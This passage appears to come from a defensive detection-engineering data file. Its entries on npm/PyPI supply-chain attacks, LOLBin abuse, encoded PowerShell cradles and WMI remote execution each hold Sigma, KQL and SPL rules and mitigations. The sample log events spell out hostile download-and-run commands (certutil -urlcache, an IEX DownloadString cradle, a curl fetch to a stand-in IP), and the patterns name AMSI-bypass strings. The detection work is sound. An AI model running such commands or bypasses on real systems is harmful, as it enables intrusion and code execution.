  fix=["ASR: 'Block all Office applications from creating child processes' (d4f940ab-401b-4efc-aadc-ad5f3c50688a) and 'Block Win32 API calls from Office macros'",
       "Block ISO/IMG/VHD auto-mount for users; keep mark-of-the-web on extracted files (7-Zip and WinRAR have options for it)",
       "Strip or quarantine LNK, ISO, OneNote and HTML attachments at the mail gateway"]),

dict(id='ia-supply', sec='access', t='Poisoned packages and fake job interviews for developers', att=['T1195.002', 'T1566.003'], sev='high',
  lens="Developers hold the keys: source code, cloud credentials, crypto wallets. North Korean operators approach them as recruiters (Operation Dream Job, 'Contagious Interview') and ask them to run a coding test from a repository, "
       "or publish npm and PyPI packages with names close to real ones. Install scripts (postinstall, setup.py) run the moment the package is installed.",
  sig=["node.exe, npm, python or pip starting a shell, curl/wget, or PowerShell during an install",
       "A developer workstation connecting to a newly registered domain or raw IP right after cloning a repository",
       "New Python or Node processes reading browser profile folders or crypto wallet extension storage"],
  logs="Endpoint process and network telemetry on developer machines; package-manager logs; repository audit logs.",
  q=dict(
    sigma=r"""title: Package manager or Node runtime starts a shell or downloader
status: experimental
description: Install scripts that shell out to download a second stage, as in npm and PyPI supply-chain attacks.
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\node.exe'
      - '\python.exe'
      - '\pip.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\curl.exe'
      - '\mshta.exe'
      - '\certutil.exe'
      - '\bitsadmin.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Build tools that download toolchains with curl (baseline by command line)
level: medium
tags:
  - attack.initial-access
  - attack.t1195.002""",
    kql=r"""DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("node.exe", "npm.cmd", "python.exe", "pip.exe", "yarn.cmd", "bun.exe")
| where FileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe", "curl.exe", "certutil.exe", "mshta.exe", "bitsadmin.exe")
| where ProcessCommandLine has_any ("http", "iex", "-enc", "DownloadString", "Invoke-WebRequest")
| project Timestamp, DeviceName, AccountName, InitiatingProcessCommandLine, ProcessCommandLine""",
    cli=r"""# Before running a stranger's project: read what install will execute
cat package.json | jq '.scripts'            # preinstall / install / postinstall
npm install --ignore-scripts                 # install without running them
grep -rnE "child_process|eval\(|Function\(|atob\(|Buffer.from\(.{0,40}base64" --include=*.js . | head
pip download PACKAGE --no-deps -d /tmp/x && tar -tzf /tmp/x/*.tar.gz | head   # look inside before installing"""),
  ev=['EventID=1 ParentImage="C:\\Program Files\\nodejs\\node.exe" Image="C:\\Windows\\System32\\curl.exe" CommandLine="curl -s hxxp://198.51.100.7/p.txt -o %TEMP%\\p.ps1"', 'EventID=1 ParentImage="C:\\Program Files\\nodejs\\node.exe" Image="C:\\Program Files\\nodejs\\npm.cmd"'],
  fp="Toolchains that fetch binaries during install (node-gyp, Electron, Puppeteer's browser download).",
  fix=["Coding tests and unknown repositories run in a disposable VM or a cloud dev box, never on the work laptop",
       "Use an internal package proxy with allow-lists, lockfiles, and npm's --ignore-scripts for untrusted code",
       "Keep cloud credentials and wallet keys off developer laptops; short-lived tokens via SSO"]),

# ------------------------------------------------------------------ execution
dict(id='ex-lolbin', sec='exec', t='Signed Windows binaries doing the attacker\u2019s work', att=['T1218', 'T1105', 'T1140'], sev='high',
  lens="Bringing malware means bringing something an EDR can flag. Windows already ships tools that download files (certutil, bitsadmin), run remote scripts (mshta, regsvr32 /i:http), "
       "or load arbitrary DLLs (rundll32). They are signed by Microsoft and allowed everywhere — the LOLBAS project lists more than 200. Volt Typhoon ran entire intrusions this way.",
  sig=["certutil with -urlcache, -split or -decode; bitsadmin /transfer",
       "mshta with an http URL or javascript:; regsvr32 with /i:http and scrobj.dll (Squiblydoo)",
       "rundll32 with javascript:, a DLL in a user-writable folder, or an ordinal like #1 on a file without .dll",
       "Any of these making a network connection, which most never do in normal use"],
  logs="Process creation with command line; network connections by process (Sysmon 3 / EDR).",
  q=dict(
    sigma=r"""title: Windows binary used to download or run remote code
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_certutil:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - 'urlcache'
      - '-decode'
      - 'verifyctl'
  selection_mshta:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'http'
      - 'javascript:'
      - 'vbscript:'
  selection_regsvr32:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains|all:
      - '/i:'
      - 'scrobj'
  selection_bits:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains: '/transfer'
  selection_rundll:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains:
      - 'javascript:'
      - '\AppData\'
      - '\Users\Public\'
  condition: 1 of selection_*
falsepositives:
  - certutil used by PKI admins to dump certificates (no urlcache); software installers using bitsadmin
level: high
tags:
  - attack.stealth
  - attack.t1218""",
    kql=r"""DeviceNetworkEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName in~ ("certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe", "bitsadmin.exe", "msbuild.exe", "installutil.exe", "cmstp.exe", "odbcconf.exe")
| where RemoteIPType == "Public"
| summarize conns = count(), urls = make_set(RemoteUrl, 10), devices = dcount(DeviceId) by InitiatingProcessFileName, InitiatingProcessCommandLine
| order by devices asc""",
    spl=r"""index=sysmon EventCode=1 (Image="*\\certutil.exe" CommandLine="*urlcache*") OR (Image="*\\mshta.exe" CommandLine="*http*") OR (Image="*\\regsvr32.exe" CommandLine="*/i:*" CommandLine="*scrobj*") OR (Image="*\\bitsadmin.exe" CommandLine="*/transfer*")
| stats count min(_time) as first by host User Image CommandLine ParentImage
| convert ctime(first)"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\certutil.exe" CommandLine="certutil.exe -urlcache -split -f hxxp://198.51.100.7/a.txt C:\\Users\\Public\\a.exe" ParentImage="C:\\Windows\\System32\\cmd.exe"', 'EventID=1 Image="C:\\Windows\\System32\\certutil.exe" CommandLine="certutil -store my" ParentImage="C:\\Windows\\System32\\cmd.exe"'],
  fp="PKI administration with certutil (store, dump, verify — no URL cache); some installers use bitsadmin.",
  fix=["WDAC or AppLocker rules that block mshta, regsvr32 scriptlets and certutil downloads for standard users",
       "Block outbound internet for these binaries at the host firewall — none needs it for daily work",
       "Hunt against the LOLBAS list quarterly: every binary there that runs on your estate, by command line"]),

dict(id='ex-pwsh', sec='exec', t='Encoded and download-cradle PowerShell', att=['T1059.001', 'T1027.010'], sev='high',
  lens="PowerShell is still the operator's favourite: -EncodedCommand to hide the script from casual eyes, IEX (New-Object Net.WebClient).DownloadString to run code that never touches disk, "
       "-WindowStyle Hidden and -NoProfile so the user sees nothing. Script block logging (event 4104) defeats most of it, because PowerShell logs the decoded script it is about to run.",
  sig=["-enc / -EncodedCommand / -e followed by a long base64 string; FromBase64String in a script block",
       "IEX or Invoke-Expression together with DownloadString, Invoke-WebRequest, Net.WebClient or iwr",
       "-w hidden, -nop, -ep bypass together; PowerShell started by Office, a script host, WmiPrvSE or a service",
       "Event 4104 script blocks containing AMSI bypass strings (AmsiUtils, amsiInitFailed) or reflection on System.Management.Automation"],
  logs="PowerShell Operational log with script block logging (4104) and module logging (4103); process creation.",
  q=dict(
    sigma=r"""title: PowerShell download cradle or encoded command
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_enc:
    CommandLine|contains:
      - ' -enc '
      - ' -EncodedCommand '
      - ' -ec '
  selection_cradle:
    CommandLine|contains|all:
      - 'iex'
      - 'http'
  selection_cradle2:
    CommandLine|contains:
      - 'DownloadString'
      - 'DownloadFile'
      - 'Net.WebClient'
      - 'Invoke-WebRequest'
      - 'Start-BitsTransfer'
  condition: selection_img and (selection_enc or selection_cradle or selection_cradle2)
falsepositives:
  - Management agents and SCCM that run encoded commands (baseline by parent and exact command)
level: high
tags:
  - attack.execution
  - attack.t1059.001""",
    kql=r"""// Script block logging sees the decoded script, whatever the command line hid
DeviceEvents
| where Timestamp > ago(14d) and ActionType == "PowerShellCommand"
| extend cmd = tostring(parse_json(AdditionalFields).Command)
| where cmd has_any ("DownloadString", "FromBase64String", "AmsiUtils", "amsiInitFailed", "VirtualAlloc", "Reflection.Assembly", "Net.Sockets.TCPClient")
| project Timestamp, DeviceName, InitiatingProcessAccountName, cmd""",
    spl=r"""index=wineventlog source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational" EventCode=4104
| search ScriptBlockText IN ("*DownloadString*", "*FromBase64String*", "*AmsiUtils*", "*amsiInitFailed*", "*VirtualAlloc*", "*Reflection.Assembly*Load*", "*Net.Sockets.TCPClient*")
| stats count values(Path) as scripts by host UserID ScriptBlockText
| sort - count""",
    cli=r"""# Decode an -enc payload without running it (PowerShell base64 is UTF-16LE)
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'))
# or in OSINTrix: Decoder → paste the whole command line (it detects -enc and unwraps nested layers)"""),
  ev=['EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\'hxxp://198.51.100.7/a\')" ParentImage="C:\\Windows\\System32\\wscript.exe"', 'EventID=1 Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" CommandLine="powershell.exe -File C:\\Scripts\\backup.ps1" ParentImage="C:\\Windows\\System32\\svchost.exe"'],
  fp="SCCM/Intune and RMM agents use encoded commands; Chocolatey install one-liners use DownloadString.",
  fix=["Turn on script block logging, module logging and transcription by GPO, and send 4104 to the SIEM",
       "Remove PowerShell 2.0 (no AMSI, no logging): Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root",
       "Constrained Language Mode for standard users via WDAC; sign your admin scripts"]),

dict(id='ex-wmi', sec='exec', t='Remote execution through WMI', att=['T1047'], sev='high',
  lens="wmic /node:host process call create, Invoke-WmiMethod, or Impacket's wmiexec start a process on another machine without installing a service. "
       "On the target, every such process has the same parent: WmiPrvSE.exe. Impacket's wmiexec also writes command output to a file on ADMIN$, leaving a distinctive command line.",
  sig=["WmiPrvSE.exe starting cmd.exe, powershell.exe or anything from a user-writable path",
       "cmd.exe /Q /c ... 1> \\\\127.0.0.1\\ADMIN$\\__<timestamp> 2>&1 (Impacket wmiexec/smbexec output redirection)",
       "wmic.exe with /node: and 'process call create' on the source host"],
  logs="Process creation on servers and workstations; 4624 type 3 logons around the same time.",
  q=dict(
    sigma=r"""title: Impacket-style remote execution output written to ADMIN$
status: stable
description: wmiexec and smbexec run commands through cmd.exe and redirect the output to a file on the ADMIN$ share.
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains|all:
      - 'cmd.exe /Q /c'
      - '\\127.0.0.1\ADMIN$\__'
      - '2>&1'
  selection_parent:
    ParentImage|endswith: '\WmiPrvSE.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection or selection_parent
falsepositives:
  - Management tools that run commands through WMI (SCCM client health, some backup agents)
level: high
tags:
  - attack.execution
  - attack.t1047""",
    kql=r"""DeviceProcessEvents
| where Timestamp > ago(14d)
| where InitiatingProcessFileName =~ "wmiprvse.exe" and FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "rundll32.exe", "mshta.exe")
| summarize n = count(), cmds = make_set(ProcessCommandLine, 5) by DeviceName, AccountName
| order by n asc"""),
  ev=['EventID=1 ParentImage="C:\\Windows\\System32\\wbem\\WmiPrvSE.exe" Image="C:\\Windows\\System32\\cmd.exe" CommandLine="cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1764163200.53 2>&1"', 'EventID=1 ParentImage="C:\\Windows\\System32\\services.exe" Image="C:\\Windows\\System32\\svchost.exe" CommandLine="svchost.exe -k netsvcs"'],
  fp="SCCM, some monitoring agents and inventory scripts run through WMI — they have stable command lines you can name.",
  fix=["Block WMI (DCOM, TCP 135 and the dynamic range) and WinRM from workstations to workstations at the host firewall",
       "Restrict remote WMI namespace permissions to admin groups; tier admin accounts so one workstation compromise does not reach servers",
       "ASR rule 'Block process creations originating from PSExec and WMI commands' (d1e49aac-8f56-4280-b9ba-993a6d77406c) where it does not break management"]),
]
